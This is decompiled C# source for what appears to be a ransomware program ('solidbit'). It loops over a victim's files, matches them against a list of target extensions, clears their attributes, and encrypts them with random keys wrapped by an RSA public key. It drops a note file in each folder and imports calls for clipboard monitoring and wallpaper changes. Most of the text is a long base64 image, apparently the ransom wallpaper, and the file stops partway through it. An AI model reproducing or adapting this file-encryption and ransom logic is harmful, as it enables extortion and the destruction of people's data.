using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using ns0;

namespace KamelAmenThaabet;

public class Form1 : Form
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private sealed class Class0
	{
		public Form1 form1_0;

		public string string_0;
	}

	private sealed class Class1
	{
		private sealed class Class2
		{
			public Class1 class1_0;

			public Class0 class0_0;

			public string string_0;

			public bool method_0(string string_1)
			{
				return string_1 == string_0.ToLower();
			}
		}

		public Class0 class0_0;

		public string[] string_0;

		public bool bool_0;

		public string[] string_1;

		public void method_0(int int_0)
		{
			try
			{
				Class2 @class = new Class2();
				@class.class1_0 = this;
				@class.class0_0 = class0_0;
				@class.string_0 = Path.GetExtension(string_0[int_0]);
				string fileName = Path.GetFileName(string_0[int_0]);
				if (!Array.Exists(class0_0.form1_0.string_3, @class.method_0) || !(fileName != class0_0.form1_0.string_2))
				{
					return;
				}
				FileInfo fileInfo = new FileInfo(string_0[int_0]);
				try
				{
					fileInfo.Attributes = FileAttributes.Normal;
				}
				catch
				{
				}
				string text = class0_0.form1_0.method_4(40);
				string text2 = class0_0.form1_0.method_4(16);
				string text3 = text + "|" + text2;
				if (class0_0.form1_0.method_3(string_0[int_0]))
				{
					string string_ = class0_0.form1_0.method_7(text3, rsaKey());
					class0_0.form1_0.method_6(string_0[int_0], text3, string_);
				}
				if (bool_0)
				{
					bool_0 = false;
					string path = class0_0.string_0 + "/" + class0_0.form1_0.string_2;
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
					if (!File.Exists(path) && class0_0.string_0 != folderPath)
					{
						File.WriteAllLines(path, class0_0.form1_0.list_0);
					}
				}
			}
			catch (Exception)
			{
			}
		}

		public void method_1(int int_0)
		{
			try
			{
				new DirectoryInfo(string_1[int_0]).Attributes &= ~FileAttributes.Normal;
			}
			catch
			{
			}
			class0_0.form1_0.method_2(string_1[int_0]);
		}
	}

	private sealed class Class3
	{
		public string string_0;

		public bool method_0(string string_1)
		{
			return string_1 == string_0;
		}
	}

	private static Mutex mutex_0 = null;

	internal string string_0;

	internal string string_1;

	internal string string_2;

	internal List<string> list_0;

	internal string[] string_3;

	internal Random random_0;

	internal IContainer icontainer_0;

	internal Panel panel1;

	internal Panel panel2;

	internal PictureBox pictureBox1;

	internal Label label1;

	internal Panel panel3;

	internal Panel panel4;

	internal PictureBox pictureBox2;

	internal Label label3;

	internal Label label2;

	internal Label label5;

	internal Label label4;

	internal Panel panel6;

	internal LinkLabel linkLabel4;

	internal Label label7;

	internal Label label6;

	internal PictureBox pictureBox3;

	internal Panel panel5;

	internal LinkLabel linkLabel1;

	internal Label label9;

	internal Label label8;

	internal Label label10;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint uint_0, uint uint_1, string string_4, uint uint_2);

	public Form1()
	{
		string text = (string_0 = "solidbit");
		string text2 = (string_1 = "/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAIBAQEBAQIBAQECAgICAgQDAgICAgUEBAMEBgUGBgYFBgYGBwkIBgcJBwYGCAsICQoKCgoKBggLDAsKDAkKCgr/2wBDAQICAgICAgUDAwUKBwYHCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgr/wAARCAH0AyADASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD8n6KKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACvuT/gmJ/wS++Cf7ZPwO8RePfjl8Sde8Oa54k8USeDPgfb6XfWsNtqfiSPSLvUXW9E8Ls1sPLtI8xlCXm2bgXUj4br9iPjF+xD4o+EPw//AGW/hN8Pv28/2bvhb4k+Buk2/i3xN4Z+KnxQXRtYj8W6hPBqM/n2whlby0RLaKNpCrFA2EVSMgHw/wD8Ec/2ZfhV+01/wU6+Hv7NX7SfgSTWPDeqza3Dr2gy31zZs8ltpF9OimS3kjlQpPAjHawztwcgkHP8Mfs+/CLUf+CRfir9p+88I7/HWm/HjTvDtlrn2+4Hl6bLpUs7weSJPJOZVVt5QuMYDAcV9/fCP4BaH8Ef+Dp7wT4l8CXdjeeEfida6x478I6ppV0lxZ3trqfhzU5ZJbeWP5JITci5CMvBQIRwRXxn4K/5QH+OP+zoNI/9Mc9AHyX4E8AeO/il4tsfAPwy8Fat4i17UpDHpui6Dpst5d3ThSxWOGJWdyFUnCgnAJ7UeGvAPjvxp4ztfhx4O8Fatq3iK+vPsdnoOm6bLPe3FxnHkpAimRpM8bQCc9q0vgn8XPGHwC+MPhf43/D69+z654R1+01fS5GGV8+3lWVQw6MpK4ZTkMpIIIJFfqv4z+F3g79kj9on4x/8FsvANisPgzXfhXbeLPgfI0keB4s8VI9t5OPmWR7OT+0pZYAAY0MedoxkA/K/4ffs+/Hr4teMrz4dfCr4I+L/ABN4g09pBqGg+H/DV1e3lsUYq4khhjZ02kEHIGCCDVC7+E3xUsPiPF8HL74aeIIfF0+pRadD4Vm0addSkvJWVI7dbYp5pldmVVjC7mLAAEkV90fED49/Gn9kH/gjN+znrH7KHxL1vwXffFrxd4z1P4peJvCupSWuo3t/YahHa2MMl3CRNGv2Zmbyg4D43kHk16h4Y+IHj39pPwp/wTt/ah/aIuZ9T+Ikn7RUXhi38W6kCL7X9DtNdsXheZ25ufJmkmiEo7l9xZ2ZiAfmXpPwb+L2vfFBvghofwq8SXnjSPUptPk8IWmh3EmqLeQlhLbm1VDKJUKOGj27lKNkDBo0v4NfGDXNI1XX9E+FPiS8sNB1K307XL610K4kh068nkMcFtO6oVilkdWRI3IZmUgAkYr7/wD2U4Zh/wAHQmqRmFt3/DRfjNtu052+fqZz9Mc/Sj9nD44fFP8AZ3/YP/bZ+KHwY8WzaD4itvi14bgsdZtYka4tBLqGoRu8LOp8qTYzKJFw67sqVOCAD8+PiJ8M/iR8IfFU3gX4sfD7XPC+t28cclxo/iLSZrK6iSRBJGzRTKrqGRlZSRgqwIyCK+5P+Cc3/BPvwpf/ALHnin9ub49fsCfE/wCOqt4mstD+Hfw48KNqmnR6pE8czXeqPPZQPNJbxsixLJDuRZUZHBLAp8O/En4pfE34y+L7j4g/GD4i694r168WNbvXPEmrzX15OqIEQPNOzOwVFVRknAAA4Ffc3wS/ah/aY+GP/BB7xJqvw2/aI8deHrrQ/wBonTdK0W50Pxde2kmn2Euk3E8lpA0UqmKF5iZGjXCs53EE80AeY6n8G/2SfHnjX4O694L/AGYfjB4Hb4gfGW40zxNoPiyTzfC0em/2wIU0zStQKx3lzPBbyRRXDykOsm4/KSK84/bf+Auk+BP+CgfxQ/Zy/Z98AXz2Oj/EbU9H8K+G9MW4vrjyYrl0igj3GSaZgoA5LMcckmvqvRtQv9W/Yt/YF1TVL2a5urn9obxFLcXFxIXklkbXNOLOzHlmJJJJ5JNfQXw0vvgT8H/jt/wUO/at+Kl38StLvvC/xUtdJTxX8H1sf+El0OwvtUvVna0e9Bjt1leOFJZuHCIQjKS2QD8j/i18A/jr8A9Vt9C+OvwW8WeC767i821s/Fvhy602WaPONyJcRoWGe4GK1tB/ZK/ar8U/DhvjH4Y/Zl+IWpeEY0Lv4qsPBd9NpqqCAWNykRiABIGd3cV9t/te/wDBSn9gf4ufsKeKf2aPB3jv9qj4l+JrzxHpWteD9W/aEvtH1KPRriC4VblUu7ef7THHNaPOhTDjeI9vlguW92v/ANpa7/4KM/HPTfGf/BOT/gsD4w+EPjrWLO0tvCv7NvizT77T9EsZbWyUG1tri2Lae6MYjsRoGZycEcqpAPxsrtfhP+zb+0V8ere+uvgZ8A/GvjSLTADqUnhPwrd6itoCM/vDbxvs4/vYrk9Z0jUvD2sXWgazZtb3ljcyW93bvjdHIjFWU47ggiv2N+Nf7QX7EX7EnwQ+APwX8U/Gj9sD4bw3XwR8P+JLW1/Z41vR9M0XV7i9h825vp5JmSa7uZJt/mby0agIqBRxQB+RHhj4U/FHxt4nvPBXgz4ba/q+s6fb3Fxf6Tpejz3F1bQwKWnkkiRS6LGqlnYgBACWxitPxV+zt+0D4F+Hmm/F3xt8C/GWj+E9Z2jR/FGq+GLu306+3AlfJuZIxHLkA42sc4r9P/gH+2f8Bf2of+Cvdx+0z+yppXjC1ksf2a9bi17U/iJpOmpqGq65ZaXdIb+aKzaS3kMkKWhf5VDOsg8tV2ivNv8Agn1+1T+1B+278D/2w/hz+1N+0D4p8c6Kn7OOt+KbfTfE2qPeW9pqVhJFcW8tvFISlthx92IIoIU4yi4APgP4T/Af45fHrVptA+BnwZ8WeNL63j8y4svCfh251GaJf7zJbo7KODyR2om+A/xxtrvxBYXHwZ8WRz+ErVbrxVC/h25D6NAzhBLdjZm3QsyqGk2glgM5Ir7a/aM+P/x//Ys/4JrfsveC/wBknx3r3w70b4heG9Y8S+L/ABN4OvptPvPEGsrqBhaOa9gZXYW8KxIIlYbVkUPuwmL/APwTp/bP/af8Q/D/APau/af8UfF/UtX+IGg/A/Tl0rxVrEcV1dQtDqlusMhaVGDyR5ysjhnVgrA5UEAHxN45/ZX/AGnvhh4Ybxt8S/2cPHnh3Ro7e1nk1bXPB97aWqxXJcW0hlliVAspjkEbZw5jbbnacc9o/wANPiP4i8Faz8SfD/gDW77w74dkt4/EGv2elTS2WltcOUgW4nVTHCZGBVA7DeQQuTX25/wTK/ab+J/7Zfxp8ffsT/tc/HfxJ4qt/wBoP4eS+FdH1rxp4jub4aZrlpJJf6LKWlZ28qO6MyrEmBvusjGSDh/tsaVrv7En/BO74T/sA6zpzaX4z8dapcfE74rafLGq3FpvBs9IsZSCWG2CKWZomxteRTtyckA+c4f2Jf2zrnV9e8P2/wCyN8T5L/wsiP4msU8A6iZtIV4VnU3SeTutwYWWQGQLlGDDgg16L+w3/wAE0Pi5+3J8L/ix8SvAlp4kRfhv4Wk1DS7XSfBdxqQ8Q6kpXGlRPG67LgowfaolfHPlkHNfXv8AwWm/4KMft7/A7/gsV4o+H3wD/aK8XaPpfhPUvDzeHfCWiag8NjdzS6Vp9w0dzbR4S+8yWVgROsmVIT7qqo9m8c+MNU/Z7/bK/wCCkPgz9nX4mat4b0vTfhWvibS7Pw34glt47HXJ7OxlvL2EQuBFcLcTSqZFw6fcJGMUAfj14g/Z0/aD8J/E+D4I+KfgT4y03xpdeX9m8I6h4Xu4dUl8wZTbavGJW3DkYXkdKr/Ff4G/Gz4Da5D4Y+OXwe8VeC9SuIfOg0/xZ4fudOnkj/vrHcIjFfcDFfox/wAExvjl4ai/Y+/aE/bk/a2+MXx21TxRZ6x4b8O6h8RvhzrFvfeLtJ0mYy7UjvNULm1t5JlijeRXVjsjRSOQY/jD+3f/AME9v2tvgh4V/Yn03x/+098QNQ1b4xaBfab4k/aAvtGvZtIgkuUtr6KK/t5TcJFJbyN+7YOgdEYbPmyAfF/7J37G3xv+MXxC8C+L9Q/Zs8ca18NdT8cabp+ueJLPwzfnS2t3vIo542vYkCR/IxBIcMuc5B5ql/wUG+FngT4H/tyfFr4O/C7Qv7L8OeGfiBqmm6Hp32qWb7Naw3LpHH5krNI+FAG52Zj3JNfav7Sf/BQD9tXwz/wWoj+BPg34+eLPBvgXwl8Y9N8KeH/APhfVJtM0W30W3vobaGD7DCywujwAE7kIIfjChQPkr/gq7/ykw+PH/ZVtb/8ASySgD5+ooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKANj4eeMG+Hvj/Q/HyeHdN1dtD1i11BdJ1iORrS98mVZPInWN0cxPt2sEdGKk4ZTgjof2lv2hPiF+1d8e/Ff7RnxVltW1/wAX6xJqGoR2KOtvAWwFhhWR3ZYo0CxorMxCIoLEjNcNRQB9RfBj/grP+0R8EPE/wL8a+HvAngfUdY/Z+0rWtM8H6lrGm3kk2oWepJOjQXxju081IFuJBAIhFsz83mc58p0v9qr4haT+yLqv7F9to2it4X1jx5b+Lbm/kt5v7QW9htXtVjVxL5YhKOSVMZbdghgOK8zooAK+1P8AgoP+0Bo3hX9hH9nH/gnh8PfjPpvjCy8J+HZ/F/ja70HXIr6zttZ1KeeWLTd8RKeZZRTTK2GbDXLDIwQPiuigD6I/ZJ/4KY/HX9kn4eaj8FLbwJ8P/iN8PtT1T+07j4ffFjwjHrWkpf7PLF3HGWR45duBlXCnHINYP7Uv7f8A+0b+1t8SfDfxH8fazpei/wDCE28dv4E0Hwbo8emab4bhjkEqJZwRfcw4U7mLP8iAsVRQvitFAH3do/8AwcI/ti+HfiLpfxk8P/A/4F2HjKGTd4m8YWHwwig1XxYvl7dmo3UcolK5CsRbtBkqAcplD83WP7Z/xR0/4H/FT4BQ6DoB0f4u+JtP1zxJctaz/aba4s7iaeJbZvO2pGWmYMHSQkAYYHJPkVFABXpml/tVfELSf2RdV/YvttG0VvC+sePLfxbc38lvN/aC3sNq9qsauJfLEJRySpjLbsEMBxXmdFAHtFh+3P8AFrTvhX8H/hDB4d8OnTfgp4wvPEnhWdrOfz7q6ubqC5dLs+fteIPAgAjWNgpbLE4I3vBH/BTz9qb4afta+OP2xPAGqaLpuu/Ee8v5fGXh7+y/tGi6nDdyGSa0ltbhpN8O48BmLqOj8nPzzRQB9OftF/8ABUv4nfH7wFN8NPDv7M/wM+F2j3l5b3erQ/Cj4YwaVJqM0EyzRNNM7yyHDqpwrKDtAIPOe4u/+C5/7SsenTav4Q/Zy+APhfx9cW0sUnxe8M/Ce2tfFAMgZZJVug5jSRlYgssQPcYPNfFdFADpppbiVp55WkkkYs7u2SxPUk9zX1N+z1/wVy/aA+B/wa0v9nvxx8IPhP8AGDwX4feZvC+gfGfwImuR6IZWDOLVvMjkRSR90sygHAAAGPleigD6Os/+CoH7QVn+0fe/tNReD/AcWrXXgW+8I2uiaf4WWw0qw0y6glhZILezeLayCZyrMzHcRu3gYrif2XP2xvib+yVpXxK0f4caFoN7H8UvhvqXgnxA2t2s0jW+n3qhZZbfypo9k4Cjazh0HdGryeigD6W/Ze/4KnfHv9mf4RL+z1qfw0+GfxR+H1vqcmo6b4J+L3giLW7DTruQfvJrfLRyRlj820PsDFmCgu5al4l/4KZfHTxRefFC4m8C+ArC3+K3gu18Latpuh+GfsFppOnW86TRJYQ28iJEwZANziTIJyCTmvnaigD3H/gmv4U8JeLf27Phevj74y6V8PtD0nxba6zq3i/WNeh01NPgsXF2xjnmIVZ28kRxdT5jpweapf8ABQb9qvVv22P2yviB+0rqMk32fxHr0h0W3mPzW2mxAQ2cXQYKwRxg4Ay249Sa8booA/V7/gqB/wAFpdX+FX/BQ34hT/swfDP9nXx1b2D6S/gf4xN4HstZ1jT3OkWbSPaanDLslaO4MqguJdhTZ0TaPhL9mX/goZ+0l+y7+0B4i/aO8OazpvijWvGlje2Xjux8dWH9pWXia1u5BJcw3sbMrSLI6hmKsrHkZ2swPh1FAH0z4X/4KrftA/Db9ofXv2gPgp8OPhn4Dt/FOjxaV4k+HPhLwPDb+FdTs0GPKm052dXzkkvu35ZsMAzAwftPf8FNfiR+0n8Px8LdG/Zx+Cvws0OS+hvb61+EPw4h0aS9uIWLRySzF5JcqT0V1U4BIJGa+baKAPtq1/4L1ftgRS6L4vv/AIT/AAZ1D4haOLWNvi/qPwzt5vFV/bwAKIJr0v8AdZAEZ40jlA5V1b5q+Vf2g/jZ4q/aS+OXi34/+OdP0+11nxl4gutY1S10mGSO1inuJWkdYlkd3VAWOAzscdSetcfRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUV6V+xn/yeB8Kf+ylaF/6cIK/bD9sr/iKO/wCGpfHP/DIn/JM/+Egm/wCEL/5En/jx42f8fv8ApHr/AK35vWgD8BaK+2vj9b/tl69/wTE8a/Fj46ftDedp97+2JqWleMfhr/wiWnLv8Uvpkl7d6v8A2hb4YZYyQ/ZYlEH8anGFrr/F3/BFT9mj4UfG+x+Afxv/AOCrvgnwv4g8S2GlyeC9LfwLe3d1c3F7BG6R6gIZjDpUfmSBFklmYumJSiKyggH57Vt6F8NfiN4o8G678RfDXgDW9R8P+F/sv/CTa7Y6VNNZ6R9pkMVv9qmVSlv5sgKR+YV3sCFyeK9/+F//AAS5+MnjT9qL4k/s6+PPHPhvwbpvwda8l+Jvj/Wrpv7K0i0glMYnXAEkzTNtEMSqHcsMhcNt+ovDPwI/Za+Cv/BIL9s9/wBlr9tvT/jPpupD4dLqFxB4F1DQLjS5IvELbRJDeZ3rJ5jbGR2/1T5C8ZAPzDoor9hP+CiX/BU3/gop+yt8d/hD+zj+yr48W40HUvgn4TuF8Cv4KsNTXVbme2ZHhO+3a5cSBFUokg4+7gk0Afj3RX6ufEH4ZfCf4Uf8HK/wr8O/Czwdo/hmW61zw7f+LfCvh8x/YtF1qezEl3bReX8oXJVyFAG6RsACvd/jN/xFr/8AC4PFf/Cof+RT/wCElvv+EX/5EP8A5B32h/s3+u/e/wCq2f6z5/73OaAPwsor9S/+CfUv7Q7fsGfFT9qL9hzwFonjD9rD/hdTHxtfSaBYajrWi6BNbPK11p9pKpjDSXxYHyo33DzBsxEpTw79o/8A4Kuf8FHrbxd4Uv8A9ovwBY+F/jV8PfEh1XRPiJq3w1tdL8QRRPaS2z2dzBLbLFLDiQMoMS7SDkN8hQA+JaK/YD4H/wDBZb/gpL4w/wCCTHxy/aZ8R/tH/aPG/g/x54c07w5rf/CH6On2S2upMTx+StmIZNw/idGYfwkV4v8AsbfGrxH+318X/iX/AMFHP+Cms9v8Wrf9nb4Ri70vw7faLZWdrq12bqU6dZ3MNrBHHJbiea4d9yNksu/eimNgD856K+9PAv8AwX9/aw8Q+O7Dwn+1D4b8B+Nvgxc6gkWt/Cab4e6bFpttpzHZIlmY4VmjkjjZzEzyPhsbgwyD9Nfsk/ABP+Caf/BXL9sT4ffAnW5LW38Gfsx+JNf8EXUqLO1gsn9kX9tGRMHEvkM4jzIG3iIFgdxFAH440V+qn7Nf7Z37Rn/BTz9kD9pTTv8AgpLBonjDwX4H+EN7rnhX4kaj4OsLG68P+JI3Uafa2txbQQpvuHLgx/ffy/LB2yOrdf8A8Ehv+Hi3/Dk7xT/w7C/5KN/w0tP9q/5BH/IL/sLT/O/5C37j/WeR0+f043UAfj5RX6Ff8FZPEn/BevTvgHovhv8A4Kk3mzwLqXiiN9Hh8vwsfM1KKCYoc6QPOGIml+8Qhzzk4r89aACiv2m/4OQ/Bvh79qjU/HXiDwf4fVfHn7N+q6Jaa5Farul1PwrrdnDNDckZ3O1tqJkjIQYVLrcxGa4v9ojR/DHwD/4Ii/FT9g3RNItV1n4V33gW++ImpQvuefxPrFzJd3luSGKkWsKWdr0Vg8EgYZFAH5G0V+kdn8CfGf8AwXR/Zp+H/j/4Vva3Hx++GOoab4H+KQupFRtZ8OzS+Xp3iGU4DSG2BaG4YeZIyo0jYVUU+Gf8FUP2kfhn4v8AGHhj9jb9lzUfM+DfwN01tD8L3EY2jXtSYhtS1mQAkM9xc7yrA7dihlC+YVoA+T6K+gf+CUX/ACkw+A//AGVbRP8A0sjr9Y/2lf8AiK3/AOGjPH//AAzr/wAk+/4TbVf+EF/5EX/kDfbJfsX/AB8/v/8Aj38v/W/vP7/zZoA/Buiv1T/4J8f8FI/25fhZ/wAEnf2qtU8P/Gb7Dqnwe1DwnL4Fk/4R3TJf7IuNZ8S3h1U4a3Zbjzmkk/1vmCPP7vYAMePaZfXWp/8ABuJ4k1K+l8ya4/bHEsz7QNzN4dtyTgcDk9qAPg2ivrX/AIIUf8paPgr/ANjFc/8ApBc1+h/j7/iLx/4TvWv+EF/5An9rXP8AY/8AyIP/AB6+a3lf6z5/ubfvfN685oA/Duiv1K/4J+3H7SGkf8EzvE37UX/BN34caL4s/aKuPjBNH8R9ct/DllqniHRNHktvNgaztJ0YJFLPuJMcTbz5gwfJPlfKv/BQL9tz9rT9pbSNJ+F/7cfwb07TfiF4W1aaefxVeeBo9D126hkjCNa3kaQxBlV0DLhEwd2Q2QVAPl+ivqj/AIIufCb4HfGn/go78OfA/wAf9d0yHRZNUEttouteFzq1r4hulIEemyxcoiygsTLICi+XyDkV698UP+CcH/BPb4sfty3H7PXwM/4Ka6eviLxj4y1zT9P8O/8AClb7TdP0DVhO32PSZJ5bhI/JkkL2qTQJJtdIwsTLICoB+fNFfRtl/wAE7fF/gn4D/FT48ftReLpvhzbfDvxEfCmi6Lc6J9svPE/igFi+mwL50SxxQxqZZrnc4RCuxJSSB9hf8FIf2H/+CXHhD9mb4M+JNB/bn0PwnqkXwVa78NNpHwFv0l+Jcqb2hvbiWFl+xyzOFizdb3QHcxIGKAPywoor708J/wDBJb9iL4n+N7H9n/4Q/wDBZHwH4g+K2q3Bs9J8Nx/DnVE0a8vckLDHrKs8LhiAFZYzuJAVWJGQD4Lor6p/Y+/4Jh3f7Tfw0+OXjz4g/tC+H/hZL8C73RoNfXxlZsLN/td5c29wJLhJN0MkP2V9kSRTPcSukKhWYEs/a3/4J3fDD4O/s16T+19+yt+2LpHxo+H1z4q/4RnXtTtfCd1od1pGrmBp0he1unaR4miUkS/KCcDbggkA+W4IJ7qdLW1haSSRgsccalmZicAADqSa1PHfgDx38LfFt94B+JvgrVvDuvabII9S0XXtNls7u1cqGCyQyqroSrA4YA4IPevtLS/+CVPwP+Ak3hvRv21/+CifhX4V/FfU4bHVLL4Vy+CdS1iWxjlZXhh1K7s8pp07KQ3lujEBlPQ5rjP+C6//AClo+NX/AGMVt/6QW1AHzF4D+Hvj74p+KrTwL8MfA+seI9cv32WOj6Dpst5dXDekcUSs7n2ANS/Ej4X/ABM+Dfi+6+Hvxe+Heu+Fdfslja80PxJpE1jeQB0DoXhmVXUMjKwyBlWBHBFfo3/wRC8MfAfwh+x1+0f8fr39uK6+E/jaLw1Z6JqPiLTfAt/fXfg7SJ7+3IvoZLd1Nw11KvkeXDtlhMKy7gMV5HY/sO6L+1Fq/j39sH9pb/gpsYvhBoviyPw1pfxz8eeHtW1HVvGF2sCtGlrpsjtdP5cIXcry5jXaFDBX2AHxLBBPdTpa2sLSSSMFjjjUszMTgAAdSTXXX/7PXx90vxD4k8I6n8DvGFvq3g3T2v8Axhpdx4ZukuNCtV2bp7yMx7raMeZHl5AqjevPIz7Z+0p+wVB+zK3w7+PHwg+Pmg/Fj4U+ONfa18N+OtBsJ7Jlu7eZPMtLyzn/AHlncbSHEbFsrkg8GvuT46/8pC/+Ckn/AGQG/wD/AEHSaAPx/or68+Bv/BM34P3PwE8MftH/ALdP7dGg/AvQPH32hvh